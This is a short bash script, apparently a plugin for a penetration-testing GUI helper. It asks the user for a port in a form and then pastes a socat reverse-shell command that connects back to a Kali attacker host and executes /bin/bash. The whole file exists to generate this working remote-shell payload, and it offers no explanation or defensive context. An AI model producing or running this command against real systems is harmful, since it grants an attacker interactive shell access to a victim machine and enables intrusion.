#!/bin/bash

# Generate GUI form items (label, type (optional: default text), name, default (optional))
PORT_FIELD=$(form_item  "port" "port")

# Generate GUI form
generate_form "${PORT_FIELD}"

PORT=${form_data["port"]}

paste_command "socat TCP4:${KALI_IP}:${PORT} EXEC:/bin/bash"
